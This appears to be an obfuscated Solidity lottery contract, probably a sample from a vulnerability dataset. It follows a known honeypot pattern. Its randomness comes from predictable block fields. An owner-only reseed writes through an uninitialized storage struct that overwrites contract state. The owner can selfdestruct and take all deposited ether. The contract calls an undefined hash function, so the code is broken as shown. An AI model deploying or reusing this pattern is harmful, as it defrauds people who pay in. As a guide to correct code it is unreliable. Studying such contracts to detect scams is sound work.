// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract OpenAddressLottery{
    struct SeedComponents{
        uint _0xf0a385;
        uint _0x604ba8;
        uint _0xc584d1;
        uint _0x74be67;
    }

    address _0xaf5ed0; //address of the owner
    uint private _0xc9023e; //seed used to calculate number of an address
    uint private _0x7b9592; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x52c1f3; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0xaf5ed0 = msg.sender;
        _0x95bfea(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x526a12() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x52c1f3[msg.sender] == false);

        if(_0x6275da(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x52c1f3[msg.sender] = true; // every address can only win once

            uint _0xdddcbb=msg.value*7; //win = 7 times the ticket price

            if(_0xdddcbb>this.balance) //if the balance isnt sufficient...
                _0xdddcbb=this.balance; //...send everything we've got
            msg.sender.transfer(_0xdddcbb);
        }

        if(block.number-_0x7b9592>1000) //reseed if needed
            _0x95bfea(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x6275da(address _0x7ad2de) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0xc10caf(uint(_0x7ad2de), _0xc9023e)[0]) % 8;
    }

    function _0x95bfea(SeedComponents _0x0cc678) internal {
        uint256 _unused1 = 0;
        uint256 _unused2 = 0;
        _0xc9023e = uint256(_0xc10caf(
            _0x0cc678._0xf0a385,
            _0x0cc678._0x604ba8,
            _0x0cc678._0xc584d1,
            _0x0cc678._0x74be67
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        if (block.timestamp > 0) { _0x7b9592 = block.number; }
    }

    function _0x53c75c() {
        require(msg.sender==_0xaf5ed0);

        selfdestruct(msg.sender);
    }

    function _0x0beaa7() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0xaf5ed0);
        SeedComponents s;
        s._0xf0a385 = uint(msg.sender);
        s._0x604ba8 = uint256(block.blockhash(block.number - 1));
        s._0xc584d1 = block.difficulty*(uint)(block.coinbase);
        s._0x74be67 = tx.gasprice * 7;

        _0x95bfea(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0xaf5ed0) //owner can't participate, he can only fund the jackpot
            _0x526a12();
    }

}
